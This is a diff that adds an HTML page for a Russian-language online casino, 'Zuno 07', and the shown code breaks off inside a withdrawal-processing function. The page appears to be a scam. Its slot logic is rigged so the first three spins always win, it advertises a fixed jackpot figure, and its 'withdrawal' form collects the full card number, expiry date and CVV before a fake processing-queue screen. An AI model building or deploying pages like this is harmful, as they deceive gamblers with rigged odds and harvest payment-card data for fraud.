@@ -1,0 +1,988 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>Zuno 07 — Играй и выигрывай</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  :root {
+    --bg-0: #06080f;
+    --bg-1: #0a0e1a;
+    --bg-2: #111827;
+    --line: rgba(255,255,255,0.07);
+    --text: #e8ecf5;
+    --muted: #7b86a3;
+    --green: #00ffb2;
+    --green-2: #00d4a0;
+    --purple: #7c3aed;
+    --red: #ff4d6d;
+  }
+  html, body {
+    height: 100%;
+    background: var(--bg-0);
+    color: var(--text);
+    font-family: 'Inter', -apple-system, system-ui, sans-serif;
+    font-size: 15px;
+    line-height: 1.5;
+    overflow-x: hidden;
+  }
+  body {
+    background: radial-gradient(circle at 50% -20%, #1a1f3a 0%, #0a0e1a 45%, #06080f 100%);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+  button { font-family: inherit; cursor: pointer; border: none; background: none; color: inherit; }
+  input { font-family: inherit; }
+  a { color: var(--green); text-decoration: none; }
+
+  /* ─── NAV ─── */
+  .nav {
+    display: flex; align-items: center; justify-content: space-between;
+    padding: 16px 20px;
+    border-bottom: 1px solid var(--line);
+    position: sticky; top: 0; z-index: 50;
+    background: rgba(6,8,15,0.85);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+  }
+  .logo {
+    display: flex; align-items: center; gap: 8px;
+    font-size: 20px; font-weight: 800; letter-spacing: 0.5px;
+    background: linear-gradient(90deg, var(--green), var(--purple));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    background-clip: text;
+    cursor: pointer;
+  }
+  .logo svg { flex-shrink: 0; }
+  .logo-badge {
+    font-size: 10px; font-weight: 800;
+    background: var(--green); color: var(--bg-0);
+    padding: 3px 6px; border-radius: 5px;
+    -webkit-text-fill-color: var(--bg-0);
+    letter-spacing: 0.5px;
+  }
+  .nav-right { display: flex; align-items: center; gap: 10px; }
+  .balance-pill {
+    display: flex; align-items: center; gap: 8px;
+    background: rgba(0,255,178,0.08);
+    border: 1px solid rgba(0,255,178,0.25);
+    border-radius: 100px;
+    padding: 8px 14px;
+    font-size: 14px; font-weight: 700;
+    font-variant-numeric: tabular-nums;
+  }
+  .balance-pill svg { color: var(--green); }
+  .balance-pill b { color: var(--green); }
+  .btn-icon {
+    width: 40px; height: 40px; border-radius: 12px;
+    background: rgba(255,255,255,0.05);
+    border: 1px solid var(--line);
+    display: flex; align-items: center; justify-content: center;
+    color: var(--muted);
+    transition: all 0.15s;
+  }
+  .btn-icon:hover { color: var(--green); border-color: rgba(0,255,178,0.3); }
+
+  /* ─── SCREENS ─── */
+  .screen { display: none; flex: 1; animation: fadeIn 0.3s ease; }
+  .screen.active { display: flex; flex-direction: column; }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+  .container {
+    max-width: 900px; margin: 0 auto; width: 100%;
+    padding: 24px 20px 100px;
+    flex: 1;
+  }
+
+  /* ─── HERO ─── */
+  .hero { text-align: center; padding: 50px 0 30px; }
+  .hero h1 {
+    font-size: clamp(32px, 7vw, 56px);
+    font-weight: 900; line-height: 1.05;
+    letter-spacing: -1px;
+    margin-bottom: 16px;
+  }
+  .hero h1 .grad {
+    background: linear-gradient(90deg, var(--green), var(--purple));
+    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .hero p {
+    color: var(--muted); font-size: 16px;
+    max-width: 520px; margin: 0 auto 32px;
+  }
+  .cta {
+    display: inline-flex; align-items: center; gap: 10px;
+    padding: 18px 36px;
+    font-size: 16px; font-weight: 700;
+    background: linear-gradient(90deg, var(--green), var(--green-2));
+    color: var(--bg-0);
+    border-radius: 14px;
+    box-shadow: 0 0 50px rgba(0,255,178,0.35);
+    transition: all 0.2s;
+  }
+  .cta:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 0 70px rgba(0,255,178,0.55);
+  }
+
+  /* ─── JACKPOT ─── */
+  .jackpot {
+    margin: 40px 0;
+    background: linear-gradient(135deg, rgba(0,255,178,0.08), rgba(124,58,237,0.08));
+    border: 1px solid rgba(0,255,178,0.2);
+    border-radius: 24px;
+    padding: 36px 24px;
+    text-align: center;
+    position: relative; overflow: hidden;
+  }
+  .jackpot::before {
+    content: ''; position: absolute; inset: 0;
+    background: radial-gradient(circle at 50% 50%, rgba(0,255,178,0.15), transparent 60%);
+    pointer-events: none;
+  }
+  .jackpot-label {
+    color: var(--muted); font-size: 11px;
+    letter-spacing: 3px; text-transform: uppercase;
+    margin-bottom: 12px; font-weight: 600;
+  }
+  .jackpot-amount {
+    font-size: clamp(36px, 8vw, 64px);
+    font-weight: 900;
+    color: var(--green);
+    font-variant-numeric: tabular-nums;
+    text-shadow: 0 0 60px rgba(0,255,178,0.5);
+    letter-spacing: -1px;
+  }
+
+  /* ─── FEATURES ─── */
+  .features {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 14px;
+    margin-top: 24px;
+  }
+  .feature {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid var(--line);
+    border-radius: 18px;
+    padding: 24px;
+    transition: border 0.2s;
+  }
+  .feature:hover { border-color: rgba(0,255,178,0.2); }
+  .feature-icon {
+    width: 44px; height: 44px; border-radius: 12px;
+    background: rgba(0,255,178,0.1);
+    color: var(--green);
+    display: flex; align-items: center; justify-content: center;
+    margin-bottom: 14px;
+  }
+  .feature h3 { font-size: 16px; margin-bottom: 6px; font-weight: 700; }
+  .feature p { color: var(--muted); font-size: 13px; }
+
+  /* ─── LOBBY ─── */
+  .page-title {
+    font-size: 28px; font-weight: 800;
+    margin-bottom: 6px; letter-spacing: -0.5px;
+  }
+  .page-sub { color: var(--muted); margin-bottom: 24px; font-size: 14px; }
+  .game-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+    gap: 14px;
+  }
+  .game-card {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid var(--line);
+    border-radius: 20px;
+    padding: 24px;
+    text-align: left;
+    transition: all 0.2s;
+    position: relative; overflow: hidden;
+  }
+  .game-card:hover {
+    transform: translateY(-3px);
+    border-color: rgba(0,255,178,0.35);
+    box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+  }
+  .game-card-icon {
+    width: 56px; height: 56px; border-radius: 16px;
+    background: linear-gradient(135deg, rgba(0,255,178,0.15), rgba(124,58,237,0.15));
+    color: var(--green);
+    display: flex; align-items: center; justify-content: center;
+    margin-bottom: 16px;
+  }
+  .game-card h3 { font-size: 18px; font-weight: 700; margin-bottom: 4px; }
+  .game-card p { color: var(--muted); font-size: 13px; }
+  .game-card .hot {
+    position: absolute; top: 14px; right: 14px;
+    font-size: 10px; font-weight: 800;
+    background: var(--red); color: #fff;
+    padding: 3px 7px; border-radius: 5px;
+    letter-spacing: 0.5px;
+  }
+
+  /* ─── SLOTS ─── */
+  .machine {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(0,255,178,0.2);
+    border-radius: 28px;
+    padding: 32px 24px;
+    text-align: center;
+    box-shadow: 0 0 80px rgba(0,255,178,0.08);
+    margin-top: 20px;
+  }
+  .reels {
+    display: flex; gap: 12px;
+    justify-content: center;
+    margin-bottom: 28px;
+  }
+  .reel {
+    width: 90px; height: 90px;
+    background: linear-gradient(180deg, #1a1f3a, #0f1424);
+    border: 2px solid rgba(0,255,178,0.3);
+    border-radius: 18px;
+    display: flex; align-items: center; justify-content: center;
+    color: var(--green);
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+  .reel svg { width: 46px; height: 46px; }
+  .reel.win { border-color: var(--green); box-shadow: 0 0 30px rgba(0,255,178,0.5); }
+  .reel.spinning svg { animation: reelBlur 0.08s linear infinite; }
+  @keyframes reelBlur {
+    0%,100% { transform: translateY(-24px); opacity: 0.2; }
+    50% { transform: translateY(24px); opacity: 1; }
+  }
+  .spin-btn {
+    padding: 18px 44px;
+    font-size: 16px; font-weight: 800; letter-spacing: 0.5px;
+    background: linear-gradient(90deg, var(--green), var(--green-2));
+    color: var(--bg-0);
+    border-radius: 14px;
+    transition: all 0.2s;
+    box-shadow: 0 0 40px rgba(0,255,178,0.3);
+  }
+  .spin-btn:hover:not(:disabled) { transform: translateY(-2px); }
+  .spin-btn:disabled { opacity: 0.4; cursor: not-allowed; }
+  .bet-info {
+    color: var(--muted); font-size: 12px;
+    margin-top: 16px; letter-spacing: 1.5px; font-weight: 600;
+  }
+
+  /* ─── FORM ─── */
+  .form-card {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid rgba(0,255,178,0.15);
+    border-radius: 24px;
+    padding: 32px 28px;
+    max-width: 480px;
+    margin: 0 auto;
+  }
+  .balance-box {
+    background: rgba(0,255,178,0.08);
+    border: 1px solid rgba(0,255,178,0.2);
+    border-radius: 14px;
+    padding: 16px 20px;
+    margin-bottom: 24px;
+    display: flex; justify-content: space-between; align-items: center;
+  }
+  .balance-box span { color: var(--muted); font-size: 13px; }
+  .balance-box b {
+    color: var(--green); font-size: 20px; font-weight: 800;
+    font-variant-numeric: tabular-nums;
+  }
+  label {
+    display: block; font-size: 12px; font-weight: 600;
+    color: var(--muted); margin-bottom: 8px;
+    letter-spacing: 0.8px; text-transform: uppercase;
+  }
+  input[type=text], input[type=tel], input[type=password] {
+    width: 100%;
+    padding: 14px 16px;
+    font-size: 15px;
+    background: rgba(0,0,0,0.4);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 12px;
+    color: var(--text);
+    margin-bottom: 18px;
+    outline: none;
+    transition: border 0.15s;
+  }
+  input:focus { border-color: var(--green); }
+  input::placeholder { color: rgba(255,255,255,0.25); }
+  .methods { display: flex; gap: 10px; margin-bottom: 20px; }
+  .method {
+    flex: 1; padding: 16px 10px;
+    text-align: center;
+    background: rgba(0,0,0,0.3);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 14px;
+    color: var(--muted);
+    transition: all 0.15s;
+    cursor: pointer;
+  }
+  .method svg { display: block; margin: 0 auto 6px; }
+  .method span { font-size: 12px; font-weight: 600; }
+  .method.active {
+    border-color: var(--green);
+    color: var(--green);
+    background: rgba(0,255,178,0.08);
+  }
+  .submit-btn {
+    width: 100%;
+    padding: 16px;
+    font-size: 15px; font-weight: 800; letter-spacing: 0.5px;
+    background: linear-gradient(90deg, var(--green), var(--green-2));
+    color: var(--bg-0);
+    border-radius: 12px;
+    margin-top: 10px;
+    transition: all 0.2s;
+  }
+  .submit-btn:hover { transform: translateY(-2px); }
+  .row-2 { display: flex; gap: 10px; }
+  .row-2 > div { flex: 1; }
+
+  /* ─── PROCESSING ─── */
+  .processing {
+    text-align: center;
+    padding: 40px 0;
+    max-width: 480px;
+    margin: 0 auto;
+  }
+  .spinner {
+    width: 72px; height: 72px;
+    margin: 0 auto 24px;
+    border: 3px solid rgba(0,255,178,0.15);
+    border-top-color: var(--green);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .processing h2 { font-size: 22px; margin-bottom: 10px; font-weight: 700; }
+  .processing p { color: var(--muted); font-size: 14px; margin-bottom: 24px; }
+  .queue-box {
+    background: rgba(255,255,255,0.03);
+    border: 1px solid var(--line);
+    border-radius: 16px;
+    padding: 20px;
+    margin-bottom: 16px;
+  }
+  .queue-row {
+    display: flex; justify-content: space-between;
+    padding: 10px 0;
+    font-size: 14px;
+  }
+  .queue-row + .queue-row { border-top: 1px solid var(--line); }
+  .queue-row span { color: var(--muted); }
+  .queue-row b { font-variant-numeric: tabular-nums; }
+  .progress {
+    height: 6px;
+    background: rgba(255,255,255,0.06);
+    border-radius: 100px;
+    overflow: hidden;
+    margin-top: 16px;
+  }
+  .progress-bar {
+    height: 100%;
+    background: linear-gradient(90deg, var(--green), var(--purple));
+    border-radius: 100px;
+    transition: width 0.5s ease;
+    box-shadow: 0 0 20px rgba(0,255,178,0.5);
+  }
+  .error-box {
+    background: rgba(255,77,109,0.08);
+    border: 1px solid rgba(255,77,109,0.3);
+    border-radius: 14px;
+    padding: 16px 20px;
+    margin-bottom: 20px;
+    display: flex; align-items: flex-start; gap: 12px;
+    text-align: left;
+  }
+  .error-box svg { color: var(--red); flex-shrink: 0; margin-top: 2px; }
+  .error-box div { font-size: 13px; color: #ffb3c1; line-height: 1.5; }
+  .btn-ghost {
+    padding: 14px 28px;
+    border: 1px solid var(--line);
+    border-radius: 12px;
+    color: var(--muted);
+    font-size: 14px; font-weight: 600;
+    transition: all 0.15s;
+    cursor: pointer;
+  }
+  .btn-ghost:hover { color: var(--text); border-color: rgba(255,255,255,0.2); }
+
+  /* ─── TOAST ─── */
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(100px);
+    background: rgba(20,26,42,0.95);
+    border: 1px solid rgba(0,255,178,0.3);
+    border-radius: 14px;
+    padding: 14px 22px;
+    font-size: 14px; font-weight: 600;
+    box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+    z-index: 1000;
+    transition: transform 0.3s ease;
+    display: flex; align-items: center; gap: 10px;
+    backdrop-filter: blur(20px);
+  }
+  .toast.show { transform: translateX(-50%) translateY(0); }
+  .toast.error { border-color: rgba(255,77,109,0.4); }
+  .toast svg { flex-shrink: 0; }
+
+  /* ─── MOBILE ─── */
+  @media (max-width: 480px) {
+    .nav { padding: 14px 16px; }
+    .logo { font-size: 18px; }
+    .balance-pill { padding: 7px 12px; font-size: 13px; }
+    .reel { width: 78px; height: 78px; }
+    .reel svg { width: 40px; height: 40px; }
+    .reels { gap: 8px; }
+    .form-card { padding: 24px 20px; }
+    .container { padding: 20px 16px 80px; }
+  }
+
+  /* ─── UTIL ─── */
+  .hidden { display: none !important; }
+  .mono { font-variant-numeric: tabular-nums; }
+</style>
+</head>
+<body>
+<!-- ═══ NAV ═══ -->
+<nav class="nav">
+  <div class="logo" onclick="go('home')">
+    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="url(#lg)" stroke-width="2.5" stroke-linejoin="round">
+      <defs>
+        <linearGradient id="lg" x1="0" y1="0" x2="1" y2="1">
+          <stop offset="0%" stop-color="#00ffb2"/>
+          <stop offset="100%" stop-color="#7c3aed"/>
+        </linearGradient>
+      </defs>
+      <path d="M4 4h16L4 20h16"/>
+    </svg>
+    Zuno <span class="logo-badge">07</span>
+  </div>
+  <div class="nav-right">
+    <div class="balance-pill">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <rect x="3" y="6" width="18" height="13" rx="2"/>
+        <path d="M3 10h18M16 14h2"/>
+      </svg>
+      <b id="navBalance">5 000</b>
+      <span style="color:var(--muted);font-weight:500">₽</span>
+    </div>
+  </div>
+</nav>
+
+<!-- ═══ SCREEN: HOME ═══ -->
+<div class="screen active" id="screen-home">
+  <div class="container">
+    <section class="hero">
+      <h1>Играй. Побеждай.<br><span class="grad">Выводи средства.</span></h1>
+      <p>Более 200 игр, моментальные выплаты, поддержка 24/7. Бонус 5 000 ₽ за регистрацию.</p>
+      <button class="cta" onclick="go('lobby')">
+        Начать играть
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M5 12h14M13 6l6 6-6 6"/>
+        </svg>
+      </button>
+    </section>
+
+    <div class="jackpot">
+      <div class="jackpot-label">Текущий джекпот</div>
+      <div class="jackpot-amount" id="jackpot">1 247 832 ₽</div>
+    </div>
+
+    <section class="features">
+      <div class="feature">
+        <div class="feature-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="3" y="6" width="18" height="13" rx="2"/>
+            <path d="M3 10h18M16 14h2"/>
+          </svg>
+        </div>
+        <h3>Мгновенный вывод</h3>
+        <p>На карту или телефон за 5 минут</p>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linejoin="round">
+            <path d="M12 2l3 7h7l-5.5 4.5L18 21l-6-4-6 4 1.5-7.5L2 9h7l3-7z"/>
+          </svg>
+        </div>
+        <h3>Щедрые бонусы</h3>
+        <p>Кэшбэк, фриспины, турниры каждую неделю</p>
+      </div>
+      <div class="feature">
+        <div class="feature-icon">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="8" r="4"/>
+            <path d="M4 21c0-4 4-7 8-7s8 3 8 7"/>
+          </svg>
+        </div>
+        <h3>Поддержка 24/7</h3>
+        <p>Онлайн-чат и Telegram в любое время</p>
+      </div>
+    </section>
+  </div>
+</div>
+
+<!-- ═══ SCREEN: LOBBY ═══ -->
+<div class="screen" id="screen-lobby">
+  <div class="container">
+    <div class="page-title">Игры</div>
+    <div class="page-sub">Выберите игру и начните выигрывать прямо сейчас</div>
+
+    <div class="game-grid">
+      <button class="game-card" onclick="go('slots')">
+        <div class="game-card-icon">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="3" y="3" width="18" height="18" rx="3"/>
+            <path d="M9 8v8M15 8v8"/>
+          </svg>
+        </div>
+        <span class="hot">HOT</span>
+        <h3>Слоты</h3>
+        <p>Классические автоматы, выигрыш до x20</p>
+      </button>
+
+      <button class="game-card" onclick="toast('Игра скоро появится','info')">
+        <div class="game-card-icon">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <circle cx="12" cy="12" r="9"/>
+            <path d="M12 3v9l6 3"/>
+          </svg>
+        </div>
+        <h3>Рулетка</h3>
+        <p>Красное или чёрное — удвой ставку</p>
+      </button>
+
+      <button class="game-card" onclick="toast('Игра скоро появится','info')">
+        <div class="game-card-icon">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M3 17l6-6 4 4 8-8"/>
+            <path d="M15 7h6v6"/>
+          </svg>
+        </div>
+        <h3>Crash</h3>
+        <p>Успей забрать до взрыва</p>
+      </button>
+
+      <button class="game-card" onclick="toast('Игра скоро появится','info')">
+        <div class="game-card-icon">
+          <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="3" y="3" width="18" height="18" rx="3"/>
+            <circle cx="8" cy="8" r="1.5" fill="currentColor"/>
+            <circle cx="16" cy="8" r="1.5" fill="currentColor"/>
+            <circle cx="8" cy="16" r="1.5" fill="currentColor"/>
+            <circle cx="16" cy="16" r="1.5" fill="currentColor"/>
+            <circle cx="12" cy="12" r="1.5" fill="currentColor"/>
+          </svg>
+        </div>
+        <h3>Кости</h3>
+        <p>Угадай сумму — выигрыш x6</p>
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SCREEN: SLOTS ═══ -->
+<div class="screen" id="screen-slots">
+  <div class="container">
+    <button class="btn-ghost" onclick="go('lobby')" style="margin-bottom:20px">
+      ← Назад в лобби
+    </button>
+
+    <div class="machine">
+      <div class="reels">
+        <div class="reel" id="r1"></div>
+        <div class="reel" id="r2"></div>
+        <div class="reel" id="r3"></div>
+      </div>
+      <button class="spin-btn" id="spinBtn" onclick="spinSlots()">КРУТИТЬ · 100 ₽</button>
+      <div class="bet-info">СТАВКА 100 ₽ · МАКС ВЫИГРЫШ x20</div>
+    </div>
+
+    <div style="text-align:center;margin-top:24px">
+      <button class="btn-ghost" onclick="go('withdraw')">Вывести средства</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SCREEN: WITHDRAW ═══ -->
+<div class="screen" id="screen-withdraw">
+  <div class="container">
+    <button class="btn-ghost" onclick="go('lobby')" style="margin-bottom:20px">
+      ← Назад
+    </button>
+
+    <div class="form-card">
+      <div class="page-title" style="font-size:22px">Вывод средств</div>
+      <div class="page-sub">Заявка обрабатывается до 24 часов</div>
+
+      <div class="balance-box">
+        <span>Доступно к выводу</span>
+        <b id="withdrawAvail">0 ₽</b>
+      </div>
+
+      <label>Сумма вывода</label>
+      <input type="text" id="withdrawAmount" placeholder="Введите сумму" inputmode="numeric">
+
+      <label>Способ вывода</label>
+      <div class="methods">
+        <div class="method active" data-method="card" onclick="selectMethod(this)">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="2" y="5" width="20" height="14" rx="2"/>
+            <path d="M2 10h20M6 15h4"/>
+          </svg>
+          <span>Карта</span>
+        </div>
+        <div class="method" data-method="phone" onclick="selectMethod(this)">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="6" y="2" width="12" height="20" rx="2"/>
+            <path d="M11 18h2"/>
+          </svg>
+          <span>Телефон</span>
+        </div>
+      </div>
+
+      <div id="cardFields">
+        <label>Номер карты</label>
+        <input type="text" id="cardNum" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
+        <div class="row-2">
+          <div>
+            <label>Срок</label>
+            <input type="text" id="cardExp" placeholder="MM/YY" maxlength="5">
+          </div>
+          <div>
+            <label>CVV</label>
+            <input type="password" id="cardCvv" placeholder="•••" maxlength="3" inputmode="numeric">
+          </div>
+        </div>
+      </div>
+
+      <div id="phoneFields" class="hidden">
+        <label>Номер телефона</label>
+        <input type="tel" id="phoneNum" placeholder="+7 (___) ___-__-__">
+      </div>
+
+      <button class="submit-btn" onclick="submitWithdraw()">Вывести средства</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ SCREEN: PROCESSING ═══ -->
+<div class="screen" id="screen-processing">
+  <div class="container">
+    <div class="processing">
+      <div class="spinner" id="procSpinner"></div>
+      <h2 id="procTitle">Обработка заявки</h2>
+      <p id="procText">Пожалуйста, не закрывайте страницу</p>
+
+      <div class="queue-box">
+        <div class="queue-row">
+          <span>Заявка</span>
+          <b id="procId" class="mono">#000000</b>
+        </div>
+        <div class="queue-row">
+          <span>Позиция в очереди</span>
+          <b id="procQueue" class="mono">0</b>
+        </div>
+        <div class="queue-row">
+          <span>Статус</span>
+          <b id="procStatus" style="color:var(--green)">В обработке</b>
+        </div>
+        <div class="progress">
+          <div class="progress-bar" id="procProgress" style="width:0%"></div>
+        </div>
+      </div>
+
+      <div id="procError" class="error-box hidden">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="12" cy="12" r="9"/>
+          <path d="M12 8v5M12 16h.01"/>
+        </svg>
+        <div id="procErrorText"></div>
+      </div>
+
+      <button class="btn-ghost" onclick="go('withdraw')">Вернуться к выводу</button>
+    </div>
+  </div>
+</div>
+
+<!-- ═══ TOAST ═══ -->
+<div class="toast" id="toast">
+  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="var(--green)" stroke-width="2.5">
+    <path d="M20 6L9 17l-5-5"/>
+  </svg>
+  <span id="toastText">Готово</span>
+</div>
+
+<script>
+/* ═══════════════════════════════════════
+   ZUNO 07 — app logic
+   ═══════════════════════════════════════ */
+
+// ─── STATE ───
+const state = {
+  balance: parseInt(localStorage.getItem('zuno_balance') ?? '5000'),
+  spinCount: parseInt(localStorage.getItem('zuno_spinCount') ?? '0'),
+  spinBusy: false,
+};
+
+// ─── ICONS ───
+const ICONS = {
+  cherry: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="7" cy="17" r="4"/><circle cx="17" cy="17" r="4"/><path d="M7 13c0-4 3-8 7-9M17 13c0-3-1-6-3-8"/></svg>',
+  diamond: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M6 3h12l3 6-9 12L3 9l3-6z"/><path d="M3 9h18M9 3l3 6 3-6M9 9l3 12 3-12"/></svg>',
+  seven: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M5 5h14l-8 14"/></svg>',
+  star: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"><path d="M12 2l3 7h7l-5.5 4.5L18 21l-6-4-6 4 1.5-7.5L2 9h7l3-7z"/></svg>',
+  clover: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M12 8a3 3 0 1 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1 3 3 3 3 0 0 1-3 3 3 3 0 0 1-3 3 3 3 0 0 1-3-3 3 3 0 0 1-3-3 3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3z"/><path d="M12 14v8"/></svg>',
+  lemon: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><ellipse cx="12" cy="12" rx="7" ry="9" transform="rotate(45 12 12)"/><path d="M8 8l8 8"/></svg>',
+};
+const KEYS = Object.keys(ICONS);
+
+// ─── NAVIGATION ───
+function go(screen) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById('screen-' + screen).classList.add('active');
+  window.scrollTo(0, 0);
+  if (screen === 'withdraw') updateWithdrawScreen();
+}
+
+// ─── BALANCE ───
+function updateBalance() {
+  localStorage.setItem('zuno_balance', state.balance);
+  document.getElementById('navBalance').textContent = state.balance.toLocaleString('ru-RU');
+  const avail = document.getElementById('withdrawAvail');
+  if (avail) avail.textContent = state.balance.toLocaleString('ru-RU') + ' ₽';
+}
+
+// ─── TOAST ───
+let toastTimer;
+function toast(text, type = 'success') {
+  const t = document.getElementById('toast');
+  document.getElementById('toastText').textContent = text;
+  t.classList.toggle('error', type === 'error');
+  t.querySelector('svg').style.stroke = type === 'error' ? 'var(--red)' : 'var(--green)';
+  t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => t.classList.remove('show'), 2200);
+}
+
+// ─── SLOTS ───
+function setReelIcon(el, key) {
+  el.innerHTML = ICONS[key];
+  el.dataset.key = key;
+}
+function randomKey() {
+  return KEYS[Math.floor(Math.random() * KEYS.length)];
+}
+function initReels() {
+  ['r1', 'r2', 'r3'].forEach((id, i) => {
+    setReelIcon(document.getElementById(id), KEYS[i % KEYS.length]);
+  });
+}
+
+function spinSlots() {
+  if (state.spinBusy) return;
+  if (state.balance < 100) { toast('Недостаточно средств', 'error'); return; }
+
+  state.spinBusy = true;
+  state.balance -= 100;
+  updateBalance();
+
+  const reels = ['r1', 'r2', 'r3'].map(id => document.getElementById(id));
+  const btn = document.getElementById('spinBtn');
+  btn.disabled = true;
+
+  reels.forEach(r => { r.classList.add('spinning'); r.classList.remove('win'); });
+
+  const interval = setInterval(() => {
+    reels.forEach(r => setReelIcon(r, randomKey()));
+  }, 80);
+
+  setTimeout(() => {
+    clearInterval(interval);
+    reels.forEach(r => r.classList.remove('spinning'));
+
+    state.spinCount++;
+    localStorage.setItem('zuno_spinCount', state.spinCount);
+
+    let result;
+    if (state.spinCount <= 3) {
+      const base = randomKey();
+      result = [base, base, KEYS[Math.floor(Math.random() * 2)]];
+    } else {
+      result = [randomKey(), randomKey(), randomKey()];
+    }
+    reels.forEach((r, i) => setReelIcon(r, result[i]));
+
+    const allSame = result[0] === result[1] && result[1] === result[2];
+    const twoSame = result[0] === result[1] || result[1] === result[2] || result[0] === result[2];
+
+    if (allSame) {
+      state.balance += 2000;
+      updateBalance();
+      reels.forEach(r => r.classList.add('win'));
+      showFlash('+2 000 ₽');
+      toast('Джекпот! +2 000 ₽');
+    } else if (twoSame) {
+      state.balance += 200;
+      updateBalance();
+      showFlash('+200 ₽');
+      toast('Выигрыш +200 ₽');
+    }
+
+    state.spinBusy = false;
+    btn.disabled = false;
+  }, 1200);
+}
+
+function showFlash(text) {
+  const el = document.createElement('div');
+  el.textContent = text;
+  el.style.cssText = `
+    position: fixed; top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    font-size: clamp(40px, 8vw, 72px); font-weight: 900;
+    color: var(--green);
+    text-shadow: 0 0 60px rgba(0,255,178,0.8);
+    pointer-events: none; z-index: 999;
+    transition: all 0.9s ease;
+  `;
+  document.body.appendChild(el);
+  requestAnimationFrame(() => {
+    el.style.opacity = '0';
+    el.style.transform = 'translate(-50%, -80%) scale(1.3)';
+  });
+  setTimeout(() => el.remove(), 1000);
+}
+
+// ─── WITHDRAW ───
+function selectMethod(el) {
+  document.querySelectorAll('.method').forEach(m => m.classList.remove('active'));
+  el.classList.add('active');
+  const m = el.dataset.method;
+  document.getElementById('cardFields').classList.toggle('hidden', m !== 'card');
+  document.getElementById('phoneFields').classList.toggle('hidden', m !== 'phone');
+}
+
+function updateWithdrawScreen() {
+  updateBalance();
+}
+
+function submitWithdraw() {
+  const amountInput = document.getElementById('withdrawAmount');
+  const amount = parseInt(amountInput.value.replace(/\D/g, '') || '0');
+
+  if (!amount || amount < 1000) { toast('Минимальная сумма — 1 000 ₽', 'error'); return; }
+  if (amount > state.balance) { toast('Недостаточно средств', 'error'); return; }
+
+  startProcessing(amount);
+}
+
+// ─── PROCESSING ───
+let processingTimer;
+function startProcessing(amount) {
+  go('processing');
+
+  const procId = Math.floor(100000 + Math.random() * 899999);
